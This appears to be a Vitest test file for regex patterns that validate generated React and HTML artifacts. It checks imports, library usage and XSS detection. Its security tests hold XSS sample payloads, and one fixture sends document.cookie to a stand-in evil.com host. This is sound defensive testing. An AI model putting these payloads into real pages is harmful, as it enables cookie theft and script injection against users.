import { describe, it, expect } from 'vitest';
import { VALIDATION_PATTERNS, VALIDATION_MESSAGES } from '../validationPatterns';

describe('validationPatterns', () => {
  describe('VALIDATION_PATTERNS', () => {
    describe('SHADCN_IMPORT', () => {
      it('should match shadcn/ui import patterns', () => {
        const validCases = [
          'import { Button } from "@/components/ui/button"',
          'import { Card } from "@/components/ui/card"',
          'import { Select } from "@/components/ui/select"',
          'from "@/components/ui/dialog"',
        ];

        validCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.SHADCN_IMPORT)).toBeTruthy();
        });
      });

      it('should NOT match valid imports', () => {
        const invalidCases = [
          'import { Button } from "@radix-ui/react-button"',
          'import { Card } from "recharts"',
          'import { Icon } from "lucide-react"',
          'from "react"',
        ];

        invalidCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.SHADCN_IMPORT)).toBeFalsy();
        });
      });

      it('should be case-sensitive', () => {
        expect('from "@/COMPONENTS/UI/button"'.match(VALIDATION_PATTERNS.SHADCN_IMPORT)).toBeFalsy();
        expect('from "@/Components/Ui/button"'.match(VALIDATION_PATTERNS.SHADCN_IMPORT)).toBeFalsy();
      });

      it('should match multiple occurrences with global flag', () => {
        const code = `
          import { Button } from "@/components/ui/button";
          import { Card } from "@/components/ui/card";
          import { Dialog } from "@/components/ui/dialog";
        `;
        const matches = code.match(VALIDATION_PATTERNS.SHADCN_IMPORT);
        expect(matches).toHaveLength(3);
      });
    });

    describe('LOCAL_IMPORT', () => {
      it('should match relative import patterns', () => {
        const validCases = [
          'import { utils } from "./utils"',
          'import { helper } from "../helpers"',
          'from "./components"',
          'from "../lib/utils"',
          'import something from "./nested/path"',
          'import { Component } from "../Component"',
        ];

        validCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.LOCAL_IMPORT)).toBeTruthy();
        });
      });

      it('should match both single and double quotes', () => {
        expect('from "./utils"'.match(VALIDATION_PATTERNS.LOCAL_IMPORT)).toBeTruthy();
        expect("from './utils'".match(VALIDATION_PATTERNS.LOCAL_IMPORT)).toBeTruthy();
      });

      it('should NOT match npm package imports', () => {
        const invalidCases = [
          'import React from "react"',
          'import { Button } from "@radix-ui/react-button"',
          'from "lodash"',
          'from "@/components/ui/button"',
        ];

        invalidCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.LOCAL_IMPORT)).toBeFalsy();
        });
      });

      it('should match multiple occurrences', () => {
        const code = `
          import { utils } from "./utils";
          import { helper } from "../helpers";
          import { config } from "./config";
        `;
        const matches = code.match(VALIDATION_PATTERNS.LOCAL_IMPORT);
        expect(matches).toHaveLength(3);
      });
    });

    describe('RADIX_UI', () => {
      it('should detect Radix UI imports', () => {
        const validCases = [
          'import * as Dialog from "@radix-ui/react-dialog"',
          'import { Button } from "@radix-ui/react-button"',
          'from "@radix-ui/react-select"',
          '@radix-ui/react-dropdown-menu',
        ];

        validCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.RADIX_UI)).toBeTruthy();
        });
      });

      it('should NOT match similar package names', () => {
        const invalidCases = [
          'import { Button } from "radix-ui"', // Missing @
          'from "radix-ui/react-button"',
          '@shadcn/ui',
          'radixui',
        ];

        invalidCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.RADIX_UI)).toBeFalsy();
        });
      });
    });

    describe('LUCIDE_REACT', () => {
      it('should detect lucide-react imports', () => {
        const validCases = [
          'import { Check } from "lucide-react"',
          'from "lucide-react"',
          'import * as Icons from "lucide-react"',
        ];

        validCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.LUCIDE_REACT)).toBeTruthy();
        });
      });

      it('should NOT match similar package names', () => {
        const invalidCases = [
          'from "lucide"',
          'from "react-lucide"',
          'from "lucide-icons"',
        ];

        invalidCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.LUCIDE_REACT)).toBeFalsy();
        });
      });
    });

    describe('RECHARTS', () => {
      it('should detect recharts imports', () => {
        const validCases = [
          'import { BarChart, Bar } from "recharts"',
          'from "recharts"',
          'import * as Charts from "recharts"',
        ];

        validCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.RECHARTS)).toBeTruthy();
        });
      });

      it('should NOT match similar package names', () => {
        const invalidCases = [
          'from "react-charts"',
          'from "chart.js"',
          'from "charts"',
        ];

        invalidCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.RECHARTS)).toBeFalsy();
        });
      });

      it('should match recharts even with suffix (expected behavior)', () => {
        // Note: The pattern /recharts/ will match "recharts-pro" - this is acceptable
        // as we're checking if recharts is being used, not preventing variants
        expect('from "recharts-pro"'.match(VALIDATION_PATTERNS.RECHARTS)).toBeTruthy();
      });
    });

    describe('DANGEROUS_HTML', () => {
      it('should detect dangerous HTML patterns', () => {
        const validCases = [
          '<script>alert("xss")</script>',
          '<iframe src="evil.com"></iframe>',
          '<a href="javascript:alert(1)">Click</a>',
          '<img src="data:text/html,<script>alert(1)</script>">',
          '<SCRIPT>alert("uppercase")</SCRIPT>',
          '<IFrame src="evil"></IFrame>',
        ];

        validCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.DANGEROUS_HTML)).toBeTruthy();
        });
      });

      it('should be case-insensitive', () => {
        expect('<script>'.match(VALIDATION_PATTERNS.DANGEROUS_HTML)).toBeTruthy();
        expect('<SCRIPT>'.match(VALIDATION_PATTERNS.DANGEROUS_HTML)).toBeTruthy();
        expect('<ScRiPt>'.match(VALIDATION_PATTERNS.DANGEROUS_HTML)).toBeTruthy();
      });

      it('should NOT match safe HTML patterns', () => {
        const invalidCases = [
          '<div>Hello World</div>',
          '<button>Click me</button>',
          '<a href="https://example.com">Link</a>',
          '<img src="image.png" alt="Safe image">',
        ];

        invalidCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.DANGEROUS_HTML)).toBeFalsy();
        });
      });

      it('should detect all dangerous patterns in single string', () => {
        const code = `
          <script>alert(1)</script>
          <iframe src="evil"></iframe>
          <a href="javascript:void(0)">Link</a>
          <img src="data:text/html,<script>alert(1)</script>">
        `;
        const matches = code.match(VALIDATION_PATTERNS.DANGEROUS_HTML);
        expect(matches!.length).toBeGreaterThanOrEqual(4);
      });
    });

    describe('XSS_PATTERNS', () => {
      it('should detect inline event handlers', () => {
        const validCases = [
          '<button onclick="alert(1)">Click</button>',
          '<div onmouseover="doSomething()">Hover</div>',
          '<img onerror="alert(1)" src="x">',
          '<body onload="init()">',
          'onsubmit="return false"',
        ];

        validCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.XSS_PATTERNS)).toBeTruthy();
        });
      });

      it('should be case-insensitive', () => {
        expect('onClick="alert(1)"'.match(VALIDATION_PATTERNS.XSS_PATTERNS)).toBeTruthy();
        expect('ONCLICK="alert(1)"'.match(VALIDATION_PATTERNS.XSS_PATTERNS)).toBeTruthy();
        expect('OnClick="alert(1)"'.match(VALIDATION_PATTERNS.XSS_PATTERNS)).toBeTruthy();
      });

      it('should detect React-style event handlers with equals sign', () => {
        // Note: The pattern /on\w+=/ will match React handlers too (onClick=)
        // This is intentional - we want to catch all event handler patterns
        // The context (quotes vs braces) can be checked in validation logic
        const reactCases = [
          'onClick={handleClick}',
          'onSubmit={handleSubmit}',
        ];

        reactCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.XSS_PATTERNS)).toBeTruthy();
        });
      });

      it('should NOT match React handlers without equals (just the prop name)', () => {
        const safeCases = [
          'const onClick',
          'function onSubmit',
          'onLoad: handler',
        ];

        safeCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.XSS_PATTERNS)).toBeFalsy();
        });
      });

      it('should detect multiple event handlers', () => {
        const code = '<div onclick="a()" onmouseover="b()" onload="c()">Test</div>';
        const matches = code.match(VALIDATION_PATTERNS.XSS_PATTERNS);
        expect(matches).toHaveLength(3);
      });
    });

    describe('EXPORT_DEFAULT', () => {
      it('should detect default exports', () => {
        const validCases = [
          'export default function Component() {}',
          'export default class MyClass {}',
          'export default MyComponent',
          'export default () => {}',
        ];

        validCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.EXPORT_DEFAULT)).toBeTruthy();
        });
      });

      it('should handle various whitespace patterns', () => {
        expect('export  default  function'.match(VALIDATION_PATTERNS.EXPORT_DEFAULT)).toBeTruthy();
        expect('export\tdefault\tfunction'.match(VALIDATION_PATTERNS.EXPORT_DEFAULT)).toBeTruthy();
        expect('export\ndefault\nfunction'.match(VALIDATION_PATTERNS.EXPORT_DEFAULT)).toBeTruthy();
      });

      it('should NOT match named exports', () => {
        const invalidCases = [
          'export { Component }',
          'export const Component = () => {}',
          'export function myFunction() {}',
        ];

        invalidCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.EXPORT_DEFAULT)).toBeFalsy();
        });
      });
    });

    describe('FUNCTION_COMPONENT', () => {
      it('should detect function component patterns', () => {
        const validCases = [
          'export default function Component() {}',
          'function MyComponent() {}',
          'export default function App() { return <div>App</div> }',
        ];

        validCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.FUNCTION_COMPONENT)).toBeTruthy();
        });
      });

      it('should match at start of string or after newline', () => {
        const code1 = 'function Component() {}';
        const code2 = '\nfunction Component() {}';
        const code3 = 'import React;\nfunction Component() {}';

        expect(code1.match(VALIDATION_PATTERNS.FUNCTION_COMPONENT)).toBeTruthy();
        expect(code2.match(VALIDATION_PATTERNS.FUNCTION_COMPONENT)).toBeTruthy();
        expect(code3.match(VALIDATION_PATTERNS.FUNCTION_COMPONENT)).toBeTruthy();
      });

      it('should NOT match inline functions', () => {
        const invalidCases = [
          'const callback = function() {}',
          'const Component = () => {}',
          'someMethod(function() {})',
        ];

        invalidCases.forEach(testCase => {
          expect(testCase.match(VALIDATION_PATTERNS.FUNCTION_COMPONENT)).toBeFalsy();
        });
      });
    });
  });

  describe('VALIDATION_MESSAGES', () => {
    it('should have clear error messages', () => {
      expect(VALIDATION_MESSAGES.SHADCN_IMPORT_ERROR).toContain('@/components/ui');
      expect(VALIDATION_MESSAGES.SHADCN_IMPORT_ERROR).toContain('Radix UI');

      expect(VALIDATION_MESSAGES.LOCAL_IMPORT_ERROR).toContain('relative imports');
      expect(VALIDATION_MESSAGES.LOCAL_IMPORT_ERROR).toContain('npm packages');

      expect(VALIDATION_MESSAGES.XSS_DETECTED).toContain('XSS');
    });

    it('should be immutable constants in TypeScript', () => {
      // Note: 'as const' provides TypeScript immutability, not runtime Object.freeze()
      // This test verifies the constants exist and are strings (TypeScript will prevent reassignment)
      expect(typeof VALIDATION_MESSAGES.SHADCN_IMPORT_ERROR).toBe('string');
      expect(typeof VALIDATION_MESSAGES.LOCAL_IMPORT_ERROR).toBe('string');
      expect(typeof VALIDATION_MESSAGES.XSS_DETECTED).toBe('string');

      // TypeScript will prevent this at compile time:
      // VALIDATION_MESSAGES.SHADCN_IMPORT_ERROR = 'New message'; // Error!
    });
  });

  describe('Type Safety', () => {
    it('should export patterns as const', () => {
      // TypeScript compilation will fail if 'as const' is not present
      // This test ensures runtime immutability
      expect(Object.isFrozen(VALIDATION_PATTERNS)).toBe(false); // 'as const' doesn't freeze

      // But we can verify the object structure exists
      expect(VALIDATION_PATTERNS).toBeDefined();
      expect(VALIDATION_PATTERNS.SHADCN_IMPORT).toBeInstanceOf(RegExp);
    });

    it('should have all expected pattern keys', () => {
      const expectedKeys = [
        'SHADCN_IMPORT',
        'LOCAL_IMPORT',
        'RADIX_UI',
        'LUCIDE_REACT',
        'RECHARTS',
        'DANGEROUS_HTML',
        'XSS_PATTERNS',
        'EXPORT_DEFAULT',
        'FUNCTION_COMPONENT',
      ];

      expectedKeys.forEach(key => {
        expect(VALIDATION_PATTERNS).toHaveProperty(key);
      });
    });

    it('should have all expected message keys', () => {
      const expectedKeys = [
        'SHADCN_IMPORT_ERROR',
        'LOCAL_IMPORT_ERROR',
        'XSS_DETECTED',
      ];

      expectedKeys.forEach(key => {
        expect(VALIDATION_MESSAGES).toHaveProperty(key);
      });
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty strings', () => {
      const emptyString = '';

      expect(emptyString.match(VALIDATION_PATTERNS.SHADCN_IMPORT)).toBeFalsy();
      expect(emptyString.match(VALIDATION_PATTERNS.LOCAL_IMPORT)).toBeFalsy();
      expect(emptyString.match(VALIDATION_PATTERNS.DANGEROUS_HTML)).toBeFalsy();
    });

    it('should handle very long strings', () => {
      const longString = 'import { Button } from "@/components/ui/button";'.repeat(1000);
      const matches = longString.match(VALIDATION_PATTERNS.SHADCN_IMPORT);

      expect(matches).toHaveLength(1000);
    });

    it('should handle special characters in strings', () => {
      const specialChars = 'from "@/components/ui/button"\n\t\r\\';
      expect(specialChars.match(VALIDATION_PATTERNS.SHADCN_IMPORT)).toBeTruthy();
    });

    it('should handle unicode characters', () => {
      const unicode = 'function Component() { return <div>Hello 世界 🌍</div> }';
      expect(unicode.match(VALIDATION_PATTERNS.FUNCTION_COMPONENT)).toBeTruthy();
    });

    it('should handle multiline strings with CRLF', () => {
      const crlf = 'import React;\r\nfunction Component() {}';
      expect(crlf.match(VALIDATION_PATTERNS.FUNCTION_COMPONENT)).toBeTruthy();
    });
  });

  describe('Real-World Scenarios', () => {
    it('should validate typical React artifact code', () => {
      const reactCode = `
import * as Dialog from "@radix-ui/react-dialog";
import { Check } from "lucide-react";

export default function MyComponent() {
  return (
    <Dialog.Root>
      <Dialog.Trigger>Open</Dialog.Trigger>
      <Dialog.Content>
        <Check className="h-4 w-4" />
      </Dialog.Content>
    </Dialog.Root>
  );
}
      `;

      expect(reactCode.match(VALIDATION_PATTERNS.SHADCN_IMPORT)).toBeFalsy();
      expect(reactCode.match(VALIDATION_PATTERNS.LOCAL_IMPORT)).toBeFalsy();
      expect(reactCode.match(VALIDATION_PATTERNS.RADIX_UI)).toBeTruthy();
      expect(reactCode.match(VALIDATION_PATTERNS.LUCIDE_REACT)).toBeTruthy();
      expect(reactCode.match(VALIDATION_PATTERNS.EXPORT_DEFAULT)).toBeTruthy();
      expect(reactCode.match(VALIDATION_PATTERNS.DANGEROUS_HTML)).toBeFalsy();
    });

    it('should detect invalid React artifact code', () => {
      const invalidCode = `
import { Button } from "@/components/ui/button";
import { utils } from "./utils";

export default function BadComponent() {
  return <button onclick="alert('xss')">Click</button>;
}
      `;

      expect(invalidCode.match(VALIDATION_PATTERNS.SHADCN_IMPORT)).toBeTruthy();
      expect(invalidCode.match(VALIDATION_PATTERNS.LOCAL_IMPORT)).toBeTruthy();
      expect(invalidCode.match(VALIDATION_PATTERNS.XSS_PATTERNS)).toBeTruthy();
    });

    it('should detect malicious HTML in artifact', () => {
      const maliciousHTML = `
<!DOCTYPE html>
<html>
<body>
  <script>
    fetch('https://evil.com/steal?data=' + document.cookie);
  </script>
  <iframe src="javascript:alert('XSS')"></iframe>
</body>
</html>
      `;

      const matches = maliciousHTML.match(VALIDATION_PATTERNS.DANGEROUS_HTML);
      expect(matches).toBeTruthy();
      expect(matches!.length).toBeGreaterThanOrEqual(2); // script + iframe
    });
  });

  describe('Context-Aware XSS Pattern Usage', () => {
    it('should provide guidance for differentiating React vs HTML handlers', () => {
      const reactCode = '<Button onClick={handleClick}>Click</Button>';
      const htmlCode = '<button onclick="alert(1)">Click</button>';

      // Both match the base pattern
      expect(reactCode.match(VALIDATION_PATTERNS.XSS_PATTERNS)).toBeTruthy();
      expect(htmlCode.match(VALIDATION_PATTERNS.XSS_PATTERNS)).toBeTruthy();

      // But we can distinguish by looking for braces vs quotes
      const isReactHandler = (code: string) => {
        const matches = code.match(VALIDATION_PATTERNS.XSS_PATTERNS);
        if (!matches) return false;
        // React handlers use ={, HTML uses ="
        return matches.some(m => {
          const index = code.indexOf(m);
          return code.slice(index + m.length).trimStart().startsWith('{');
        });
      };

      const isHtmlHandler = (code: string) => {
        const matches = code.match(VALIDATION_PATTERNS.XSS_PATTERNS);
        if (!matches) return false;
        // HTML handlers use ="
        return matches.some(m => {
          const index = code.indexOf(m);
          return code.slice(index + m.length).trimStart().startsWith('"');
        });
      };

      expect(isReactHandler(reactCode)).toBe(true);
      expect(isHtmlHandler(reactCode)).toBe(false);

      expect(isReactHandler(htmlCode)).toBe(false);
      expect(isHtmlHandler(htmlCode)).toBe(true);
    });

    it('should detect mixed React and HTML handlers', () => {
      const mixedCode = `
      <Button onClick={handleClick}>React</Button>
      <button onclick="alert(1)">HTML</button>
    `;

      const matches = mixedCode.match(VALIDATION_PATTERNS.XSS_PATTERNS);
      expect(matches).toHaveLength(2);
    });

    it('should demonstrate proper validation order for security', () => {
      const code = '<button onclick="alert(1)">Click</button>';

      // Example validation flow:
      const validateSecure = (input: string) => {
        const errors = [];

        // Priority 1: DANGEROUS_HTML (most critical)
        if (VALIDATION_PATTERNS.DANGEROUS_HTML.test(input)) {
          errors.push('Critical: Dangerous HTML detected');
        }

        // Priority 2: XSS_PATTERNS (high severity)
        if (VALIDATION_PATTERNS.XSS_PATTERNS.test(input)) {
          errors.push('High: XSS pattern detected');
        }

        return errors;
      };

      const result = validateSecure(code);
      expect(result).toContain('High: XSS pattern detected');
    });

    it('should show how to validate React artifacts correctly', () => {
      const safeReactCode = `
export default function Button() {
  return (
    <button
      onClick={handleClick}
      onMouseOver={handleHover}
      className="btn"
    >
      Click me
    </button>
  );
}
      `;

      const validateReactArtifact = (code: string): { isValid: boolean; errors: string[] } => {
        const errors = [];

        // Check for dangerous HTML first (always block)
        if (VALIDATION_PATTERNS.DANGEROUS_HTML.test(code)) {
          errors.push('Contains dangerous HTML patterns');
          return { isValid: false, errors };
        }

        // Check for event handlers
        const handlerMatches = code.match(VALIDATION_PATTERNS.XSS_PATTERNS);
        if (handlerMatches) {
          // For React artifacts, only flag if they use quotes (HTML style)
          const hasHtmlHandlers = handlerMatches.some(match => {
            const index = code.indexOf(match);
            const afterMatch = code.slice(index + match.length).trimStart();
            return afterMatch.startsWith('"') || afterMatch.startsWith("'");
          });

          if (hasHtmlHandlers) {
            errors.push('HTML event handlers detected - use React handlers with braces');
          }
        }

        return { isValid: errors.length === 0, errors };
      };

      const result = validateReactArtifact(safeReactCode);
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should show how to validate HTML artifacts correctly', () => {
      const unsafeHtmlCode = `
<!DOCTYPE html>
<html>
<body>
  <button onclick="alert('xss')">Click</button>
  <div onload="malicious()">Content</div>
</body>
</html>
      `;

      const validateHtmlArtifact = (code: string): { isValid: boolean; errors: string[] } => {
        const errors = [];

        // For HTML artifacts, block ALL event handlers
        if (VALIDATION_PATTERNS.XSS_PATTERNS.test(code)) {
          const matches = code.match(VALIDATION_PATTERNS.XSS_PATTERNS);
          errors.push(`Inline event handlers detected (${matches!.length} occurrences)`);
        }

        // Also check for dangerous HTML
        if (VALIDATION_PATTERNS.DANGEROUS_HTML.test(code)) {
          errors.push('Contains dangerous HTML patterns');
        }

        return { isValid: errors.length === 0, errors };
      };

      const result = validateHtmlArtifact(unsafeHtmlCode);
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Inline event handlers detected (2 occurrences)');
    });

    it('should demonstrate edge case: event handler in string literal', () => {
      const codeWithStringLiteral = `
export default function Component() {
  const htmlString = '<button onclick="alert(1)">Click</button>';
  return <div dangerouslySetInnerHTML={{ __html: htmlString }} />;
}
      `;

      // Pattern will match even in string literals
      expect(codeWithStringLiteral.match(VALIDATION_PATTERNS.XSS_PATTERNS)).toBeTruthy();

      // This is CORRECT behavior - we want to flag this as it's using dangerouslySetInnerHTML
      // with unsafe HTML. Validation logic should handle this case appropriately.
    });
  });
});
